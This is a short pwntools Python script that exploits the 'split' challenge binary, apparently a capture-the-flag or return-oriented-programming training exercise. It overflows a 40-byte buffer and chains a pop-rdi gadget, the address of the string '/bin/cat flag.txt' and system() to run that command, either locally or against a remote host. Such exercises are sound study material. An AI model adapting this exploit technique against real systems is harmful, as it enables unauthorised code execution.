#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)

exe = "./split"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *pwnme+88")

offset = 40
pop_rdi = 0x00000000004007c3
pop_rsi = 0x00000000004007c1
ret = 0x000000000040053e

# /bin/cat flag.txt @ 0x601060

payload = flat(
	b"A" * offset,
	pop_rdi,
	next(elf.search(b"/bin/cat flag.txt\x00")),
	ret,
	elf.sym.system
)
io.sendlineafter(b">", payload)
io.interactive()
